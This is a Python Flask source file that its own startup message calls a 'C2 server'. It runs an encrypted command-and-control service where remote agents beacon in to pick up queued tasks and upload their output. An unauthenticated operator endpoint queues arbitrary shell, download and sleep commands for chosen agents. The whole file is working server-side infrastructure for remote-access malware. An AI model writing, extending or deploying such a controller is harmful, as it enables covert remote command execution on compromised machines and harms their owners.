import sys
import os
import json
from flask import Flask, request, jsonify
from shared.protocol import decrypt_data, encrypt_data  # noqa: F401

app = Flask(__name__)


# ── In-memory task queues (per-agent) ───────────────────────────
# tasks[agent_id] = [ {task_dict_1}, {task_dict_2}, ... ]
_task_store = {}


# ── Route: /api/status ─────────────────────────────────────────

@app.route('/api/status', methods=['POST'])
def status():
    """Agent beacon endpoint.

    1. Decrypt the inbound ID from encrypted payload
    2. Pop the next queued task (if any) for that agent
    3. Return an encrypted JSON response with {"task": <obj|None>}
    """
    encrypted = request.json.get('data')

    # Decrypt inbound payload  
    try:
        decrypted_json = decrypt_data(encrypted)
        beacon_info    = json.loads(decrypted_json)
        agent_id       = beacon_info.get('id')
    except Exception as e:
        print(f"[!] Beacon decryption error: {e}")
        agent_id = None

    # Pop next task for this agent (FIFO queue)  
    if agent_id and agent_id in _task_store and _task_store[agent_id]:
        task_obj       = _task_store[agent_id].pop(0)
        response_body  = {"task": task_obj}
    else:
        response_body  = {"task": None}

    # Encrypt the response before sending it back  
    encrypted_response = encrypt_data(json.dumps(response_body))          
    return jsonify({"payload": encrypted_response})


# ── Route: /api/upload ─────────────────────────────────────────

@app.route('/api/upload', methods=['POST'])
def upload():
    """Agent result submission endpoint.

    1. Decrypt the inbound result payload  
    2. Log the output along with the agent ID
    3. Acknowledge receipt as JSON
    """
    encrypted = request.json.get('data')

    try:
        decrypted_json   = decrypt_data(encrypted)
        info             = json.loads(decrypted_json)
        agent_id         = info.get('id')
        output           = info.get('output')
        print(f"[+] Result from {agent_id}: {output}")
    except Exception as e:
        print(f"[!] Upload decryption error: {e}")

    return jsonify({"status": "received"})


# ── Route: /api/push ───────────────────────────────────────────

@app.route('/api/push', methods=['POST'])
def push():
    """Operator-facing task queue endpoint.

    Use this to enqueue shell/download/sleep tasks for one or more agents   
    Accepts either a raw string command (auto-wrapped into  
    a shell task) or a full task dict.    
    """
    agent_id       = request.json.get('id')
    command        = request.json.get('command')  

    # Auto-wrap bare string commands into a shell task  
    if isinstance(command, dict):
        data         = command
    elif (command and not isinstance(command, dict)):
        data         = {"type": "shell", "command": str(command)}
    else:
        return jsonify({"status": "reject — missing command"})

    # Enqueue the task for this agent's next beacon round    
    if agent_id not in _task_store:
        _task_store[agent_id]  = []
        
    _task_store[agent_id].append(data)  

    return jsonify({"status": "task queued"})


# ── Entry point ────────────────────────────────────────────────

if __name__ == "__main__":
    print("[*] C2 server running on 0.0.0.0:5000")  
    app.run(host="0.0.0.0", port=5000)
